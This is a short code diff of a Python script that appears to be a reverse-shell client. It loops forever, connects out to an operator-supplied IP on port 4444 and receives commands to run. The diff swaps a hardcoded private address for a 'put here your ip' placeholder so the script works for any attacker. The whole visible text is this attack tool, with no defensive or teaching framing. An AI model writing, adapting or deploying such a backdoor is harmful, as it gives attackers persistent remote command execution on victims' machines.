@@ -2,10 +2,13 @@ import socket
 import os
 import time
 
+ip = "" # put here your ip
+port = 4444
+
 while True:
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client.connect(("10.100.102.12", 4444))
+        client.connect((ip, port))
 
         while True:
             command = client.recv(5000).decode()
